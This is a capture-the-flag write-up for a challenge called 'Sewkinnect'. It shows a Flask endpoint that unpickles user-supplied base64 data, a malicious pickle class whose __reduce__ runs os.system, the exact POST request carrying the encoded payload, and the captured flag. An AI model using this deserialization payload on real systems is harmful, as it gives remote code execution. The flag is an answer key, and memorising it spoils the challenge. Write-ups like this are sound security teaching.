# Sewkinnect
`Clone2Own`
In `app.py` there's a function called `calculate()`, the source code looks like this:
```python
@app.route("/calculate", methods=['POST'])
def calculate():
	body_parts = pickle.loads(base64.b64decode(request.form.get("body_parts")))
	point_cloud = pickle.loads(base64.b64decode(request.form.get("point_cloud")))
	calc = calculations.CalculationObject(point_cloud, body_parts)
	calc.calc_joint_angles()
	calc.calc_lengths()
	calc.calc_girths()
	calc.convert_measures_to_inches()
	timestamp = datetime.datetime.now().strftime("%x %X")
	kinect_data[timestamp] = calc.measures
	return "200 OK"
```

Pickling is interesting! We can make an evil pickling object like this:
```python
class Evil(object):
    def __reduce__(self):
        return (os.system, ('cat /flag* > /usr/src/app/static/js/lol.js',))

evil_pickle = pickle.dumps(Evil())
evil_pickle_base64 = base64.b64encode(evil_pickle).decode('utf-8')
```
Such that when we pickle, and reduce is called we'll be able to get remote code execution. We can send the following `POST` request:
```
POST /calculate HTTP/1.1
Host: site.local:5000
Content-Length: 115
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

body_parts=Y3Bvc2l4CnN5c3RlbQpwMAooUydjYXQgL2ZsYWcqID4gL3Vzci9zcmMvYXBwL3N0YXRpYy9qcy9sb2wuanMnCnAxCnRwMgpScDMKLg==
```
And there's flag!

Flag:
`TDCNET{hv0r_3r_m1n_XB0000000000000000000000000000000000000X}`